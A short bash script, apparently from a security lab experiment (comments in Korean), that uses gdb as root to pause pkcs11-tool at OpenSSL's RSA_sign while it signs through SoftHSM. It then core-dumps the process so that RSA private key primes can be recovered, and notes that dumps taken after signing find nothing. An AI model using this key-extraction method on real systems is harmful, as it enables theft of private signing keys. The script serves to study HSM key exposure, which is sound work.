#!/bin/bash
# [H2] root 가 SoftHSM 서명 중인 프로세스 메모리를 덤프한다. hsm-lab 컨테이너(--cap-add SYS_PTRACE) 안에서 실행.
# 서명 "후" 덤프(C_Sign finish, C_CloseSession, C_Finalize)는 0건 -> SoftHSM 이 사용 후 지움.
# 서명 "도중" (OpenSSL RSA_sign 진입) 에 덤프해야 p, q 가 남아 있다.
set -e
M=/usr/lib/softhsm/libsofthsm2.so
PIN=${1:-1234}
cd /tmp
echo "kernel image hash placeholder" > data.bin
pkcs11-tool --module $M --read-object --type pubkey --id 01 -o pub.der >/dev/null 2>&1
openssl rsa -pubin -inform DER -in pub.der -noout -modulus | cut -d= -f2 > n.hex
gdb -q --batch -ex "set breakpoint pending on" -ex "break RSA_sign" -ex run -ex bt -ex "gcore core.rsa" -ex kill \
  --args pkcs11-tool --module $M --login --pin $PIN --sign -m SHA256-RSA-PKCS --id 01 -i data.bin -o sig.bin
# sig.bin 은 위 kill 로 안 생기므로 정상 서명을 한 번 더 받는다 (비교용)
pkcs11-tool --module $M --login --pin $PIN --sign -m SHA256-RSA-PKCS --id 01 -i data.bin -o sig.bin
ls -l core.rsa n.hex sig.bin
